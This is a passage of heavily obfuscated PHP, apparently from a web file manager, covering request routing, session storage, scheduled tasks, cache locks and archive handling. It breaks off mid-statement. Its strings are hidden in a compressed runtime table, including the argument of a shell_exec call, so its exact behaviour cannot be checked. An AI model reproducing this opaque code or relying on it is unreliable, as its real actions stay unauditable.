public static function dispatch() { goto a¤îäÀë—ğ; a¤îäÀë—ğ: $D¼’¿½…• =& $_SERVER[¼]; $dæñøøÍ = parse_url($_SERVER[$D¼’¿½…•[1355]], PHP_URL_PATH); $B‘¾¥æ‡«© = $_SERVER[$D¼’¿½…•[151]]; goto f‰àé°„˜î; BÃ‘–àí÷Ã: self::$routes = preg_replace($D¼’¿½…•[1066], $D¼’¿½…•[8], self::$routes); if (in_array($dæñøøÍ, self::$routes)) { $FÈóØ›ô†º = array_keys(self::$routes, $dæñøøÍ); foreach ($FÈóØ›ô†º as $c°Ã»¸™³Ú) { if (self::$methods[$c°Ã»¸™³Ú] == $B‘¾¥æ‡«© || self::$methods[$c°Ã»¸™³Ú] == $D¼’¿½…•[1356] || in_array($B‘¾¥æ‡«©, self::$maps[$c°Ã»¸™³Ú])) { $C¶á–Àîº‘ = !0; if (!is_object(self::$callbacks[$c°Ã»¸™³Ú])) { $a¡ŠÉºÛÀÄ = explode($D¼’¿½…•[8], self::$callbacks[$c°Ã»¸™³Ú]); $b£…¿îİÉ„ = end($a¡ŠÉºÛÀÄ); $bÜËÔ¼òñ± = explode($D¼’¿½…•[1357], $b£…¿îİÉ„); $AÆ®Èâİê‚ = new $bÜËÔ¼òñ±[0](); $AÆ®Èâİê‚->{$bÜËÔ¼òñ±[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$c°Ã»¸™³Ú]); if (self::$halts) { return; } } } } } else { $c›ô¦“’É¿ = 0; foreach (self::$routes as $c°Ã»¸™³Ú) { if (strpos($c°Ã»¸™³Ú, $D¼’¿½…•[4]) !== !1) { $c°Ã»¸™³Ú = str_replace($BÌÌ®Ô¯„ó, $AùÆ”­ì, $c°Ã»¸™³Ú); } if (preg_match($D¼’¿½…•[1358] . $c°Ã»¸™³Ú . $D¼’¿½…•[1359], $dæñøøÍ, $DÉ”àÕ Ë„)) { if (self::$methods[$c›ô¦“’É¿] == $B‘¾¥æ‡«© || self::$methods[$c›ô¦“’É¿] == $D¼’¿½…•[1356] || !empty(self::$maps[$c›ô¦“’É¿]) && in_array($B‘¾¥æ‡«©, self::$maps[$c›ô¦“’É¿])) { $C¶á–Àîº‘ = !0; array_shift($DÉ”àÕ Ë„); if (!is_object(self::$callbacks[$c›ô¦“’É¿])) { $a¡ŠÉºÛÀÄ = explode($D¼’¿½…•[8], self::$callbacks[$c›ô¦“’É¿]); $b£…¿îİÉ„ = end($a¡ŠÉºÛÀÄ); $bÜËÔ¼òñ± = explode($D¼’¿½…•[1357], $b£…¿îİÉ„); $AÆ®Èâİê‚ = new $bÜËÔ¼òñ±[0](); if (!method_exists($AÆ®Èâİê‚, $bÜËÔ¼òñ±[1])) { echo $D¼’¿½…•[1360]; } else { call_user_func_array(array($AÆ®Èâİê‚, $bÜËÔ¼òñ±[1]), $DÉ”àÕ Ë„); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$c›ô¦“’É¿], $DÉ”àÕ Ë„); if (self::$halts) { return; } } } } $c›ô¦“’É¿++; } } if ($C¶á–Àîº‘ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $d–ïÖ‘”Ù =& $_SERVER[¼]; header($_SERVER[$d–ïÖ‘”Ù[1361]] . $d–ïÖ‘”Ù[1362]); echo $d–ïÖ‘”Ù[1363]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$D¼’¿½…•[1355]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto B…äÎİÔÙ‰; f‰àé°„˜î: $BÌÌ®Ô¯„ó = array_keys(static::$patterns); $AùÆ”­ì = array_values(static::$patterns); $C¶á–Àîº‘ = !1; goto BÃ‘–àí÷Ã; B…äÎİÔÙ‰: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto eÊ“É­š”á; C…¬¶ÅŠ: switch ($F¿Å‡Ñæìå) { case $b“ºğœµö¬[17]: self::$handle = Model($b“ºğœµö¬[747]); break; case $b“ºğœµö¬[748]: self::$handle = new CacheRedis($Eí­÷Ë¸‘, $fÛ¾¥ÀÙã); break; case $b“ºğœµö¬[749]: self::$handle = new CacheMemcached($Eí­÷Ë¸‘, $fÛ¾¥ÀÙã); break; case $b“ºğœµö¬[164]: $Eí­÷Ë¸‘[$b“ºğœµö¬[75]] = $Eí­÷Ë¸‘[$b“ºğœµö¬[75]] . $b“ºğœµö¬[1367]; self::$handle = new CacheFile($Eí­÷Ë¸‘, $fÛ¾¥ÀÙã); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Fˆ¢×Ó•×  = new self(); goto dñ¹…„Ò³¤; b¦ÅÁ…‘Ÿ: $C¢•©â¿Ú› = _get($GLOBALS, $b“ºğœµö¬[1365], $C¢•©â¿Ú›); if (self::$sessionSign) { } else { if (Cookie::get($C¢•©â¿Ú›)) { self::$sessionSign = Cookie::get($C¢•©â¿Ú›); } else { self::$sessionSign = guid(); } } Cookie::setSafe($C¢•©â¿Ú›, self::$sessionSign, self::$sessionTime); goto AÕ¨·Ç§¢æ; eÊ“É­š”á: $b“ºğœµö¬ =& $_SERVER[¼]; static $Fˆ¢×Ó•×  = false; if ($Fˆ¢×Ó•× ) { return $Fˆ¢×Ó•× ; } goto Cº¥Ô˜¶èÀ; AÕ¨·Ç§¢æ: $F¿Å‡Ñæìå = $AÚÍ–ÎæÃó[$b“ºğœµö¬[1366]]; $Eí­÷Ë¸‘ = $AÚÍ–ÎæÃó[$F¿Å‡Ñæìå]; $fÛ¾¥ÀÙã = $AÚÍ–ÎæÃó[$b“ºğœµö¬[746]]; goto C…¬¶ÅŠ; Cº¥Ô˜¶èÀ: $AÚÍ–ÎæÃó = $GLOBALS[$b“ºğœµö¬[6]][$b“ºğœµö¬[334]]; self::$sessionTime = $AÚÍ–ÎæÃó[$b“ºğœµö¬[1364]]; $C¢•©â¿Ú› = SESSION_ID; goto b¦ÅÁ…‘Ÿ; dñ¹…„Ò³¤: return $Fˆ¢×Ó•× ; goto cËÎº ƒĞï; cËÎº ƒĞï: } public static function sign($aÏïòÅ´Ã¹ = false) { $aÏïòÅ´Ã¹ && (self::$sessionSign = $aÏïòÅ´Ã¹); self::init(); return self::$sessionSign; } public static function set($E§Àïİ‰½‹, $d¸¹¡ˆÑš = false) { self::init(); if (is_array($E§Àïİ‰½‹)) { foreach ($E§Àïİ‰½‹ as $A„Øõ›ìÛğ => $c‘…¦„Ş) { array_set_value(self::$data, $A„Øõ›ìÛğ, $c‘…¦„Ş); } } else { array_set_value(self::$data, $E§Àïİ‰½‹, $d¸¹¡ˆÑš); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cÇÕï‘ƒõÕ = false) { self::init(); if (!$cÇÕï‘ƒõÕ) { return self::$data; } return array_get_value(self::$data, $cÇÕï‘ƒõÕ); } public static function remove($B¼øó”ÏÕÕ) { self::init(); unset(self::$data[$B¼øó”ÏÕÕ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¼][751])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto B´ëŞÌ†; B´ëŞÌ†: $D—¾Ø‘„‘ =& $_SERVER[¼]; if (self::valueGet($D—¾Ø‘„‘[681]) != $D—¾Ø‘„‘[83]) { return; } if (self::valueGet($D—¾Ø‘„‘[1368]) == $D—¾Ø‘„‘[83]) { $f­ã²–¡ = self::valueGet($D—¾Ø‘„‘[1369]); if (time() - $f­ã²–¡ > 3600 * 2) { self::restart(); } return; } goto AÃ½à‰; CÌØ‰Ö¥Œ: while (!0) { self::cacheClear(); if (self::valueGet($D—¾Ø‘„‘[681]) != $D—¾Ø‘„‘[83]) { self::valueSet($D—¾Ø‘„‘[1368], $D—¾Ø‘„‘[464]); self::log($D—¾Ø‘„‘[1372]); die; } self::valueSet($D—¾Ø‘„‘[1368], $D—¾Ø‘„‘[83]); self::valueSet($D—¾Ø‘„‘[1369], time()); self::taskRunAll(); sleep(self::valueGet($D—¾Ø‘„‘[1373])); } goto cä‚¢©èÈà; AÃ½à‰: http_close(); self::valueSet($D—¾Ø‘„‘[1368], $D—¾Ø‘„‘[83]); Hook::bind($D—¾Ø‘„‘[1370], $D—¾Ø‘„‘[1371]); goto CÌØ‰Ö¥Œ; cä‚¢©èÈà: } public static function restart() { $b›ìà¥ìœé =& $_SERVER[¼]; http_close(); self::valueSet($b›ìà¥ìœé[681], $b›ìà¥ìœé[464]); sleep(self::valueGet($b›ìà¥ìœé[1373]) + 5); self::valueSet($b›ìà¥ìœé[1368], $b›ìà¥ìœé[464]); self::valueSet($b›ìà¥ìœé[681], $b›ìà¥ìœé[83]); } public static function shutdownEvent() { $F‘—ç¨¸…È =& $_SERVER[¼]; self::valueSet($F‘—ç¨¸…È[1368], $F‘—ç¨¸…È[464]); self::log($F‘—ç¨¸…È[1374]); } public static function config($C»ĞŒî‰ó…, $Bô³…ºãŒÖ) { $AÎ¹¥‡À° =& $_SERVER[¼]; $Bˆ—â‹º§‘ = 20; $Bô³…ºãŒÖ = intval($Bô³…ºãŒÖ) <= $Bˆ—â‹º§‘ ? $Bˆ—â‹º§‘ : intval($Bô³…ºãŒÖ); self::valueSet($AÎ¹¥‡À°[681], $C»ĞŒî‰ó…); self::valueSet($AÎ¹¥‡À°[1373], $Bô³…ºãŒÖ); } private static function taskRunAll() { $CÑİÙ‰îö =& $_SERVER[¼]; $açîÊöÓÜ‹ = Model($CÑİÙ‰îö[1375])->listData(); $aÍØ—¨›Ä = count($açîÊöÓÜ‹); for ($EÍÅîÜ¹Š = 0; $EÍÅîÜ¹Š < $aÍØ—¨›Ä; $EÍÅîÜ¹Š++) { $Có³µäÙ„‘ = $açîÊöÓÜ‹[$EÍÅîÜ¹Š]; if ($Có³µäÙ„‘[$CÑİÙ‰îö[1376]] != $CÑİÙ‰îö[83]) { continue; } if (!self::taskTimeCheck($Có³µäÙ„‘)) { continue; } self::taskRun($Có³µäÙ„‘); } Hook::trigger($CÑİÙ‰îö[1377]); } private static function taskTimeCheck($AÌ¯ø‚Í‚È) { goto cÙ‰ªÔÆ†ò; fæ¿¿»°¼¿: switch ($BÚùµÊÏù¯[$EŒñâÜé“Î[29]]) { case $EŒñâÜé“Î[1384]: if (time() - $E–ò”—¨Ó < 3600 * 24 * 30) { return !1; } if ($BÚùµÊÏù¯[$EŒñâÜé“Î[1384]] == date($EŒñâÜé“Î[1385]) && $DÉæîƒ²«Ë) { return !0; } break; case $EŒñâÜé“Î[1386]: if (time() - $E–ò”—¨Ó < 3600 * 24 * 7) { return !1; } $aä÷ÀƒŠ = date($EŒñâÜé“Î[1387]) == 0 ? 7 : date($EŒñâÜé“Î[1387]); if ($BÚùµÊÏù¯[$EŒñâÜé“Î[1386]] == $aä÷ÀƒŠ && $DÉæîƒ²«Ë) { return !0; } break; case $EŒñâÜé“Î[1379]: if (time() - $E–ò”—¨Ó < 3600 * 24) { return !1; } if ($DÉæîƒ²«Ë) { return !0; } break; case $EŒñâÜé“Î[1388]: if (time() - $E–ò”—¨Ó >= floatval($BÚùµÊÏù¯[$EŒñâÜé“Î[1388]]) * 60) { return !0; } break; default: break; } return !1; goto d­½õ‰§Êæ; eÜ¥¶³Ã“: $F¾ñÙí®„¢ = strtotime($EŒñâÜé“Î[1378] . $BÚùµÊÏù¯[$EŒñâÜé“Î[1379]] . $EŒñâÜé“Î[1380]) - strtotime($EŒñâÜé“Î[1381]); $A²ÄÁÌÈÁ§ = time() - strtotime(date($EŒñâÜé“Î[1382]) . $EŒñâÜé“Î[1383]); $DÉæîƒ²«Ë = $A²ÄÁÌÈÁ§ >= $F¾ñÙí®„¢ && $A²ÄÁÌÈÁ§ <= $F¾ñÙí®„¢ + 3600; goto fæ¿¿»°¼¿; cÙ‰ªÔÆ†ò: $EŒñâÜé“Î =& $_SERVER[¼]; $BÚùµÊÏù¯ = json_decode($AÌ¯ø‚Í‚È[$EŒñâÜé“Î[187]], !0); $E–ò”—¨Ó = intval($AÌ¯ø‚Í‚È[$EŒñâÜé“Î[1369]]); goto eÜ¥¶³Ã“; d­½õ‰§Êæ: } public static function taskRun($BÖƒº™Åæù) { goto eµã‚äŞ’Ê; B‘“Œ‡ÅÓô: $bÔñÄ—â = timeFloat(); $cÛŒŞ‡ßÊµ = $E¸¹ÂÆ˜¶»[33]; switch ($BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[29]]) { case $E¸¹ÂÆ˜¶»[292]: $eÌã«ƒšŞ = url_request($BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[1392]], $E¸¹ÂÆ˜¶»[213], !1, !1, !1, !1, 5); $cÛŒŞ‡ßÊµ = strlen($eÌã«ƒšŞ); break; case $E¸¹ÂÆ˜¶»[212]: $cÛŒŞ‡ßÊµ = Hook::apply($BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[1392]]); default: break; } goto bËÈêÀ¬ÛÎ; eµã‚äŞ’Ê: $E¸¹ÂÆ˜¶» =& $_SERVER[¼]; self::log($E¸¹ÂÆ˜¶»[1389] . $BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[364]] . $E¸¹ÂÆ˜¶»[1390] . $BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[28]] . $E¸¹ÂÆ˜¶»[1391] . $BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[1392]]); Model($E¸¹ÂÆ˜¶»[1375])->run($BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[364]]); goto B‘“Œ‡ÅÓô; bËÈêÀ¬ÛÎ: Model($E¸¹ÂÆ˜¶»[1393])->add(array($E¸¹ÂÆ˜¶»[1394] => $E¸¹ÂÆ˜¶»[33], $E¸¹ÂÆ˜¶»[1395] => $E¸¹ÂÆ˜¶»[464], $E¸¹ÂÆ˜¶»[29] => $E¸¹ÂÆ˜¶»[1396] . $BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[364]], $E¸¹ÂÆ˜¶»[1397] => json_encode(array($E¸¹ÂÆ˜¶»[28] => $BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[28]], $E¸¹ÂÆ˜¶»[1398] => timeFloat() - $bÔñÄ—â, $E¸¹ÂÆ˜¶»[278] => $cÛŒŞ‡ßÊµ)))); self::log($E¸¹ÂÆ˜¶»[1399] . $BÖƒº™Åæù[$E¸¹ÂÆ˜¶»[364]] . $E¸¹ÂÆ˜¶»[1400] . $cÛŒŞ‡ßÊµ); return !0; goto bÔ‚Àá•§; bÔ‚Àá•§: } private static function valueGet($DŠä»½áØ) { $DË™×ÄÍ =& $_SERVER[¼]; $eÛ±Ö¦ˆ¬ß = $DË™×ÄÍ[1401]; $dØõàÉ¢× = Model($DË™×ÄÍ[1402])->get($DŠä»½áØ, $eÛ±Ö¦ˆ¬ß); if (is_null($dØõàÉ¢×)) { Model($DË™×ÄÍ[1402])->set($DË™×ÄÍ[1373], 10, $eÛ±Ö¦ˆ¬ß); Model($DË™×ÄÍ[1402])->set($DË™×ÄÍ[681], $DË™×ÄÍ[83], $eÛ±Ö¦ˆ¬ß); Model($DË™×ÄÍ[1402])->set($DË™×ÄÍ[1368], $DË™×ÄÍ[464], $eÛ±Ö¦ˆ¬ß); $dØõàÉ¢× = Model($DË™×ÄÍ[1402])->get($DŠä»½áØ, $eÛ±Ö¦ˆ¬ß); } return $dØõàÉ¢×; } private static function valueSet($F ¢İÑâ´ë, $AŞÆ¯éÛÀ) { $eÌ¢ãµ½îë =& $_SERVER[¼]; return Model($eÌ¢ãµ½îë[1402])->set($F ¢İÑâ´ë, $AŞÆ¯éÛÀ, $eÌ¢ãµ½îë[1401]); } protected static function log($bÒäÁˆÈ¶Ú) { write_log($bÒäÁˆÈ¶Ú, $_SERVER[¼][1403]); } private static function cacheClear() { $aö°ƒ˜ÖÔ =& $_SERVER[¼]; $eÆ„‘‰‰µ² = Model($aö°ƒ˜ÖÔ[1402])->cacheKey($aö°ƒ˜ÖÔ[1401]); Cache::clearMemory($eÆ„‘‰‰µ²); } } goto a„†Ò©Šß; aùñÍ¸í˜: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c¾…Õ±Âˆä; Féù¼—šÔ: if ($Cİ²í—İÁ† == $C”ÑîİˆæÓ[17] && $a£¦Ã¡Å…ó == $C”ÑîİˆæÓ[9]) { $Cİ²í—İÁ† = $C”ÑîİˆæÓ[164]; } switch ($Cİ²í—İÁ†) { case $C”ÑîİˆæÓ[748]: self::$handle = new CacheLockRedis(); break; case $C”ÑîİˆæÓ[749]: self::$handle = new CacheLockMemcached(); break; case $C”ÑîİˆæÓ[17]: self::$handle = new CacheLockDatabase(); break; case $C”ÑîİˆæÓ[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C¬É•„éÚ“; B‹¾ÈÕ†¢: self::$timeout = $fö ­’ãÌ[$C”ÑîİˆæÓ[766]] ? $fö ­’ãÌ[$C”ÑîİˆæÓ[766]] : 10; $a£¦Ã¡Å…ó = _get($GLOBALS[$C”ÑîİˆæÓ[6]], $C”ÑîİˆæÓ[767]); $Cİ²í—İÁ† = $fö ­’ãÌ[$C”ÑîİˆæÓ[745]] ? $fö ­’ãÌ[$C”ÑîİˆæÓ[745]] : $C”ÑîİˆæÓ[164]; goto Féù¼—šÔ; c¾…Õ±Âˆä: $C”ÑîİˆæÓ =& $_SERVER[¼]; if (self::$handle) { return self::$handle; } $fö ­’ãÌ = $GLOBALS[$C”ÑîİˆæÓ[6]][$C”ÑîİˆæÓ[334]]; goto B‹¾ÈÕ†¢; C¬É•„éÚ“: } private static function key($B¢½•§ä) { return $_SERVER[¼][768] . Cache::key($B¢½•§ä); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Dò‚œ¦Úëò = '') { self::$errorMsg = $Dò‚œ¦Úëò; } public static function lockGlobal($e‹¥¬ì£ó‚, $c´”Æ©½‹) { return self::lock($e‹¥¬ì£ó‚, $c´”Æ©½‹, !0); } public static function lock($bÁÜÄáÆº÷, $D¸›Æî¤×• = false, $b«ß¦ãáèµ = false) { goto CÏÖ¨‹ì; bã•Ç¨ÑÍ: if (!$b«ß¦ãáèµ) { self::$lockItem[$bØî¾„äÙˆ] = !0; } return $F¼ê¡øÑ·; goto F²é†ò”ˆÕ; CÏÖ¨‹ì: $bÉ¡Òë¶è =& $_SERVER[¼]; $f…ğò²êì = self::init(); $bØî¾„äÙˆ = self::key($bÁÜÄáÆº÷); goto a·À¼â„²™; a·À¼â„²™: $D¸›Æî¤×• = $D¸›Æî¤×• ? $D¸›Æî¤×• : self::$timeout; $F¼ê¡øÑ· = $f…ğò²êì->lock($bØî¾„äÙˆ, $D¸›Æî¤×•); if (!$F¼ê¡øÑ·) { $dª¸ÜŸÔ = $bÉ¡Òë¶è[769] . $D¸›Æî¤×• . $bÉ¡Òë¶è[67] . self::$errorMsg . $bÉ¡Òë¶è[67] . get_caller_msg(); $BÖÆĞœŒ¼§ = "\114\x6f\143\153\x20\x61\x63\164\151\157\x6e\x3a\40{$bØî¾„äÙˆ}\x20\x74\x69\155\145\x6f\165\164\x2c\x6f\x76\145\x72\40{$D¸›Æî¤×•}\x20\163"; $BÖÆĞœŒ¼§ = self::$errorMsg ? self::$errorMsg : $Dõ£´äÂ¯İ; write_log($dª¸ÜŸÔ, $bÉ¡Òë¶è[770]); show_json($BÖÆĞœŒ¼§, !1); } goto bã•Ç¨ÑÍ; F²é†ò”ˆÕ: } public static function lockGet($eô·õå‡·) { $a‡…ñÛ½ì = self::key($eô·õå‡·); if (self::$lockItem[$a‡…ñÛ½ì]) { return self::$lockItem[$a‡…ñÛ½ì]; } return self::init()->lockGet($a‡…ñÛ½ì); } public static function unlock($F¿¿¸¨”ò‘) { $A†ùµ‰ÊÕ’ = self::key($F¿¿¸¨”ò‘); self::$lockItem[$A†ùµ‰ÊÕ’] = null; return self::init()->unlock($A†ùµ‰ÊÕ’); } public static function unlockRuntime() { $b”Ó¡†àÁµ =& $_SERVER[¼]; $aƒ§ÊÒ« = self::init(); $DÅ­Õ½Š‘„ = !1; foreach (self::$lockItem as $b£‚•¶áñ— => $E¦í‡¦™’) { if (!$E¦í‡¦™’) { continue; } $aƒ§ÊÒ«->unlock($b£‚•¶áñ—); if (!$DÅ­Õ½Š‘„) { $DÅ­Õ½Š‘„ = !0; write_log($b”Ó¡†àÁµ[771] . $b£‚•¶áñ— . $b”Ó¡†àÁµ[67] . get_caller_msg(), $b”Ó¡†àÁµ[770]); continue; } write_log($b”Ó¡†àÁµ[771] . $b£‚•¶áñ—, $b”Ó¡†àÁµ[770]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Fê¬õ¦‰àÓ =& $_SERVER[¼]; $bòŒÄÊ»èù = $GLOBALS[$Fê¬õ¦‰àÓ[6]][$Fê¬õ¦‰àÓ[334]]; self::$cachePath = $bòŒÄÊ»èù[$Fê¬õ¦‰àÓ[164]][$Fê¬õ¦‰àÓ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($E´á»ù°Šö, $Cå×®ÕïíÄ = 0) { goto A°ĞŠÚ³¤Õ; A°ĞŠÚ³¤Õ: $Eêİ¶½áè =& $_SERVER[¼]; $d¶½Íİ±­‚ = microtime(!0); $C»ñ†åË = $d¶½Íİ±­‚ + $Cå×®ÕïíÄ + 0.0001; goto eÄ¿À­âÇÃ; eÄ¿À­âÇÃ: $F½Á¥æ‚‰î = rtrim(self::$cachePath, $Eêİ¶½áè[8]) . $Eêİ¶½áè[772] . md5($E´á»ù°Šö) . $Eêİ¶½áè[773]; if (file_exists($F½Á¥æ‚‰î) && filemtime($F½Á¥æ‚‰î) && filemtime($F½Á¥æ‚‰î) < time() - 10) { @unlink($F½Á¥æ‚‰î); } do { if (file_exists($F½Á¥æ‚‰î)) { cacheLockWait(); continue; } $Fğâß§Ü‘ = fopen($F½Á¥æ‚‰î, $Eêİ¶½áè[774]); if (!$Fğâß§Ü‘) { return !1; } $D´À¿Î‹ªù = flock($Fğâß§Ü‘, LOCK_EX | LOCK_NB); self::$caches[$E´á»ù°Šö] = array($Eêİ¶½áè[775] => $Fğâß§Ü‘, $Eêİ¶½áè[164] => $F½Á¥æ‚‰î); fwrite($Fğâß§Ü‘, $C»ñ†åË); clearstatcache(); if ($Fğâß§Ü‘ && $D´À¿Î‹ªù) { return !0; } cacheLockWait(); } while (microtime(!0) < $C»ñ†åË); goto C˜¼ˆè¸âª; C˜¼ˆè¸âª: $this->unlock($E´á»ù°Šö); return !1; goto A†±ÆçÕÁ; A†±ÆçÕÁ: } public function lockGet($A‚ĞöŞÜ—õ) { $d¡ÔÄº“éµ =& $_SERVER[¼]; $bÑÚÙÉà±Ì = rtrim(self::$cachePath, $d¡ÔÄº“éµ[8]) . $d¡ÔÄº“éµ[772] . md5($A‚ĞöŞÜ—õ) . $d¡ÔÄº“éµ[773]; return file_exists($bÑÚÙÉà±Ì); } public function unlock($Cñ™À„Ç†Í) { goto D»„ŒùÚæ; cµÛ¨¿ñ¦ï: unset(self::$caches[$Cñ™À„Ç†Í]); goto A‰ãßçÓµÀ; B‹¼§¡Äè²: @flock($a¢Ó‹‹ÊÁ‹[$bºÃ¼ØÌˆã[775]], LOCK_UN); @fclose($a¢Ó‹‹ÊÁ‹[$bºÃ¼ØÌˆã[775]]); @unlink($a¢Ó‹‹ÊÁ‹[$bºÃ¼ØÌˆã[164]]); goto cµÛ¨¿ñ¦ï; D»„ŒùÚæ: $bºÃ¼ØÌˆã =& $_SERVER[¼]; $a¢Ó‹‹ÊÁ‹ = self::$caches[$Cñ™À„Ç†Í]; if (!$a¢Ó‹‹ÊÁ‹) { return; } goto B‹¼§¡Äè²; A‰ãßçÓµÀ: } } goto FõŒ¥Ø‹; CÕµøÉµÓ²: define($_SERVER[¼][0], $_SERVER[¼][1]); $_SERVER[À Ç] = explode($_SERVER[¼][2], gzinflate(substr($_SERVER[¼][3], 10, -8))); function Model($b§Ö–ºÅ«Ú = '', $aäƒƒÎòÙé = '', $e¦ºß¸ÉĞ” = '') { goto d†­»îÔÇ; FÎ¢™æ¹ØĞ: if (isset($CĞˆŠ¦¢õ[$Aâº„ÅÏÏ])) { return $CĞˆŠ¦¢õ[$Aâº„ÅÏÏ]; } if ($b§Ö–ºÅ«Ú) { $b§Ö–ºÅ«Ú = strtoupper($b§Ö–ºÅ«Ú[0]) . substr($b§Ö–ºÅ«Ú, 1); $cÅğ“˜†¼ = $b§Ö–ºÅ«Ú . $CÔ®Å¡ë÷[1]; if (class_exists($cÅğ“˜†¼)) { $CĞˆŠ¦¢õ[$Aâº„ÅÏÏ] = new $cÅğ“˜†¼(); return $CĞˆŠ¦¢õ[$Aâº„ÅÏÏ]; } } if (!$e¦ºß¸ÉĞ”) { $e¦ºß¸ÉĞ” = $GLOBALS[$CÔ®Å¡ë÷[2]][$CÔ®Å¡ë÷[3]]; } goto C¡Šèã¯ïª; d†­»îÔÇ: $CÔ®Å¡ë÷ =& $_SERVER[À Ç]; static $CĞˆŠ¦¢õ = array(); $Aâº„ÅÏÏ = strtolower($aäƒƒÎòÙé . $CÔ®Å¡ë÷[0] . $b§Ö–ºÅ«Ú); goto FÎ¢™æ¹ØĞ; C¡Šèã¯ïª: $CĞˆŠ¦¢õ[$Aâº„ÅÏÏ] = new ModelBase($b§Ö–ºÅ«Ú, $aäƒƒÎòÙé, $e¦ºß¸ÉĞ”); return $CĞˆŠ¦¢õ[$Aâº„ÅÏÏ]; goto f§İÒİµ›Ú; f§İÒİµ›Ú: } goto d…Ê›ášÄŞ; c‰Œºéòİ«: class KodArchive { static function init() { goto b™ó©âÃËİ; D»¸Ÿ´ÆÁ: require_once ARCHIVE_LIB . $CÍ©ò¤ ™[1860]; goto B·Ã¿ÔÆšê; b™ó©âÃËİ: $CÍ©ò¤ ™ =& $_SERVER[¼]; if (defined($CÍ©ò¤ ™[1849])) { return; } define($CÍ©ò¤ ™[1849], SDK_DIR . $CÍ©ò¤ ™[1850]); goto EòÓ¬½ ™ã; EòÓ¬½ ™ã: define($CÍ©ò¤ ™[1851], TEMP_FILES); define($CÍ©ò¤ ™[1852], TEMP_FILES); define($CÍ©ò¤ ™[1853], $CÍ©ò¤ ™[1854]); goto e„†¯Ìá¶£; e„†¯Ìá¶£: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $CÍ©ò¤ ™[1855]; require_once ARCHIVE_LIB . $CÍ©ò¤ ™[1856]; goto CØ»Í»§–ô; CØ»Í»§–ô: require_once ARCHIVE_LIB . $CÍ©ò¤ ™[1857]; require_once ARCHIVE_LIB . $CÍ©ò¤ ™[1858]; require_once ARCHIVE_LIB . $CÍ©ò¤ ™[1859]; goto D»¸Ÿ´ÆÁ; B·Ã¿ÔÆšê: } static function checkIfType($BØ¹èÂùËÁ, $F§‹²È²‡·) { goto D†óÚµæƒŒ; bº±½“ õì: return $C¡¨¡‘Õß®; goto E”²½â—‡»; e¾áË‹¼õÖ: $C¡¨¡‘Õß® = in_array($BØ¹èÂùËÁ, $d“ù¼×î ”[$F§‹²È²‡·]); if ($C¡¨¡‘Õß® && ($F§‹²È²‡· == $eîÎ•·—ö[298] || $F§‹²È²‡· == $eîÎ•·—ö[1864]) && (!function_exists($eîÎ•·—ö[1872]) || !function_exists($eîÎ•·—ö[1873]))) { show_tips($eîÎ•·—ö[1874]); } if ($C¡¨¡‘Õß® && $F§‹²È²‡· == $eîÎ•·—ö[1038] && (!function_exists($eîÎ•·—ö[1875]) || !strstr(shell_exec($eîÎ•·—ö[1876]), $eîÎ•·—ö[1877]))) { show_tips($eîÎ•·—ö[1878]); } goto bº±½“ õì; D†óÚµæƒŒ: $eîÎ•·—ö =& $_SERVER[¼]; self::init(); $d“ù¼×î ” = array($eîÎ•·—ö[298] => array($eîÎ•·—ö[298], $eîÎ•·—ö[1861], $eîÎ•·—ö[1862], $eîÎ•·—ö[1863]), $eîÎ•·—ö[1864] => array($eîÎ•·—ö[1864], $eîÎ•·—ö[1865], $eîÎ•·—ö[1036], $eîÎ•·—ö[1034]), $eîÎ•·—ö[1038] => array($eîÎ•·—ö[1038], $eîÎ•·—ö[1866], $eîÎ•·—ö[1867], $eîÎ•·—ö[1868], $eîÎ•·—ö[1869], $eîÎ•·—ö[1870], $eîÎ•·—ö[1871])); goto e¾áË‹¼õÖ; E”²½â—‡»: } static function listContent($Dî¡½¯¯¼á, $AÏ‘ç£ğ = true) { $AÍ‚©ÎÂè³ =& $_SERVER[¼]; self::init(); $d‘†ƒ™Ñ°Œ = !empty($GLOBALS[$AÍ‚©ÎÂè³[1042]]) ? $GLOBALS[$AÍ‚©ÎÂè³[1042]] : get_path_ext($Dî¡½¯¯¼á); $D·»¢˜°šÃ = !1; if (self::checkIfType($d‘†ƒ™Ñ°Œ, $AÍ‚©ÎÂè³[1864])) { $aù£‡‰£àè = PclTarList($Dî¡½¯¯¼á, $d‘†ƒ™Ñ°Œ); $D·»¢˜°šÃ = array(); for ($Dî¯Ö¤»ÀØ = 0; $Dî¯Ö¤»ÀØ < count($aù£‡‰£àè); $Dî¯Ö¤»ÀØ++) { $Cš¡—î—Š = $aù£‡‰£àè[$Dî¯Ö¤»ÀØ]; if 